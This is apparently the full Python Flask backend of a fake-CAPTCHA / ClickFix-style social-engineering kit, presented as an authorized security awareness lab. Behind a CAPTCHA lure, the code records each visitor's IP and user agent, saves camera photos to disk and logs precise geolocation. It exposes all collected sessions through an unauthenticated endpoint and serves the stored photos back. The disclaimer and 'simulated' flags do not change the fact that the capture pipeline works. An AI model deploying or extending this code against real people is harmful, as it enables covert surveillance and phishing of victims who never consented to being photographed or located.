"""
AUTHORIZED SECURITY AWARENESS LAB — DEMONSTRATION ONLY
--------------------------------------------------------
Fake-CAPTCHA / ClickFix-style social engineering simulator.

Data hasil simulasi akan dicetak di terminal setiap kali ada aksi.
Akses dashboard di /dashboard untuk melihat data secara visual.
"""

import os
import uuid
import datetime
import random
import time
import json
from flask import (
    Flask,
    render_template,
    request,
    jsonify,
    session,
    send_from_directory,
)

app = Flask(__name__)
app.secret_key = os.urandom(24)

CAPTURES_DIR = os.path.join(os.path.dirname(__file__), "data", "captures")
os.makedirs(CAPTURES_DIR, exist_ok=True)

# In-memory session store
SESSIONS = {}

def now_iso():
    return datetime.datetime.utcnow().isoformat() + "Z"

def get_or_create_session():
    sid = session.get("lab_session_id")
    if not sid or sid not in SESSIONS:
        sid = str(uuid.uuid4())
        session["lab_session_id"] = sid
        SESSIONS[sid] = {
            "session_id": sid,
            "created_at": now_iso(),
            "status": "INITIALIZED",
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", "unknown"),
            "camera_permission": "PENDING",
            "location_permission": "PENDING",
            "photo_path": None,
            "photo_is_simulated": False,
            "location": None,
            "location_is_simulated": False,
            "screen": None,
            "updated_at": now_iso(),
            "captcha_verified": False,
        }
    return sid

def print_session_summary(sid, extra=""):
    """Cetak data sesi ke terminal dengan rapi."""
    data = SESSIONS.get(sid)
    if not data:
        return
    print("\n" + "="*60)
    print(f"📋 SESSION UPDATE — {sid}")
    print("="*60)
    print(f"  Status      : {data.get('status')}")
    print(f"  IP          : {data.get('ip')}")
    print(f"  User-Agent  : {data.get('user_agent')[:50]}...")
    print(f"  Camera      : {data.get('camera_permission')}")
    print(f"  Location    : {data.get('location_permission')}")
    loc = data.get('location')
    if loc and loc.get('latitude'):
        print(f"  Lat/Long    : {loc.get('latitude')}, {loc.get('longitude')} (acc: {loc.get('accuracy')}m)")
    if data.get('photo_path'):
        print(f"  Photo       : data/captures/{data.get('photo_path')}")
    print(f"  Captcha     : {'✅' if data.get('captcha_verified') else '❌'}")
    if extra:
        print(f"  {extra}")
    print("="*60 + "\n")

# ========== ROUTES ==========

@app.route("/")
def index():
    get_or_create_session()
    return render_template("captcha.html")

@app.route("/dashboard")
def dashboard():
    get_or_create_session()
    return render_template("dashboard.html")

@app.route("/api/captcha/verify", methods=["POST"])
def captcha_verify():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    delay = random.uniform(0.5, 1.5)
    time.sleep(delay)
    data["captcha_verified"] = True
    data["status"] = "CAPTCHA_VERIFIED"
    data["updated_at"] = now_iso()
    print_session_summary(sid, "✅ CAPTCHA verified")
    return jsonify({"success": True, "session_id": sid})

@app.route("/api/session", methods=["GET", "POST"])
def api_session():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    if request.method == "POST":
        payload = request.get_json(silent=True) or {}
        if "status" in payload:
            data["status"] = payload["status"]
        if "screen" in payload:
            data["screen"] = payload["screen"]
        if "camera_permission" in payload:
            data["camera_permission"] = payload["camera_permission"]
        if "location_permission" in payload:
            data["location_permission"] = payload["location_permission"]
        data["updated_at"] = now_iso()
        data["ip"] = request.remote_addr
        data["user_agent"] = request.headers.get("User-Agent", data["user_agent"])
        print_session_summary(sid, "📡 Session updated via /api/session")
    return jsonify(data)

@app.route("/api/photo", methods=["POST"])
def api_photo():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    is_simulated = request.form.get("simulated", "false").lower() == "true"
    if is_simulated:
        data["photo_path"] = None
        data["photo_is_simulated"] = True
        data["camera_permission"] = "GRANTED (SIMULATED)"
        data["updated_at"] = now_iso()
        print_session_summary(sid, "📸 SIMULATED photo (no file)")
        return jsonify({"ok": True, "simulated": True})
    file = request.files.get("photo")
    if not file:
        return jsonify({"ok": False, "error": "no photo provided"}), 400
    filename = f"{sid}.jpg"
    filepath = os.path.join(CAPTURES_DIR, filename)
    file.save(filepath)
    data["photo_path"] = filename
    data["photo_is_simulated"] = False
    data["camera_permission"] = "GRANTED"
    data["updated_at"] = now_iso()
    print_session_summary(sid, f"📸 PHOTO saved: {filename}")
    return jsonify({"ok": True, "simulated": False})

@app.route("/api/location", methods=["POST"])
def api_location():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    payload = request.get_json(silent=True) or {}
    is_simulated = bool(payload.get("simulated", False))
    data["location"] = {
        "latitude": payload.get("latitude"),
        "longitude": payload.get("longitude"),
        "accuracy": payload.get("accuracy"),
        "timestamp": payload.get("timestamp", now_iso()),
    }
    data["location_is_simulated"] = is_simulated
    data["location_permission"] = "GRANTED (SIMULATED)" if is_simulated else "GRANTED"
    data["updated_at"] = now_iso()
    print_session_summary(sid, f"📍 LOCATION: {payload.get('latitude')}, {payload.get('longitude')}")
    return jsonify({"ok": True, "simulated": is_simulated})

@app.route("/api/permission_denied", methods=["POST"])
def api_permission_denied():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    payload = request.get_json(silent=True) or {}
    kind = payload.get("kind")
    if kind == "camera":
        data["camera_permission"] = "DENIED"
    elif kind == "location":
        data["location_permission"] = "DENIED"
    data["updated_at"] = now_iso()
    print_session_summary(sid, f"🚫 PERMISSION DENIED: {kind}")
    return jsonify({"ok": True})

@app.route("/api/data")
def api_data():
    sid = get_or_create_session()
    return jsonify(SESSIONS[sid])

@app.route("/api/all_sessions")
def api_all_sessions():
    """Kembalikan semua sesi yang tersimpan (untuk debug)."""
    return jsonify(list(SESSIONS.values()))

@app.route("/api/delete", methods=["POST"])
def api_delete():
    sid = get_or_create_session()
    data = SESSIONS.get(sid)
    if data and data.get("photo_path"):
        filepath = os.path.join(CAPTURES_DIR, data["photo_path"])
        if os.path.exists(filepath):
            os.remove(filepath)
    SESSIONS.pop(sid, None)
    session.pop("lab_session_id", None)
    print(f"🗑️ Session {sid} deleted.")
    return jsonify({"ok": True, "message": "Demo data deleted."})

@app.route("/data/captures/<path:filename>")
def serve_capture(filename):
    return send_from_directory(CAPTURES_DIR, filename)

if __name__ == "__main__":
    print("="*70)
    print(" AUTHORIZED SECURITY AWARENESS LAB — DEMONSTRATION ONLY")
    print(" Running on localhost. Data akan dicetak di terminal ini.")
    print(" Dashboard: http://127.0.0.1:5000/dashboard")
    print(" Semua sesi (JSON): http://127.0.0.1:5000/api/all_sessions")
    print("="*70)
    app.run(host="127.0.0.1", port=5000, debug=True)